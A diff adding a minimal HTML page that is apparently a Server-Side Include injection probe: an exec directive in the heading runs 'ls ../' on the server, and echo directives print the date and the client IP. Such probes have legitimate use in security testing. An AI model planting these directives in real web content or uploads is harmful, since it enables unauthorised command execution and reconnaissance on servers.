@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <title>Document</title>
+            </head>
+            <body>
+                <h1>Hello,<!--#exec cmd="ls ../"--></h1>
+                <br>
+                <h2>data: <!--#echo var="DATE_LOCAL"--></h2>
+                <br>
+                <h2>Client IP: <!--#echo var="REMOTE_ADDR"--></h2>
+            </body>
+            </html>
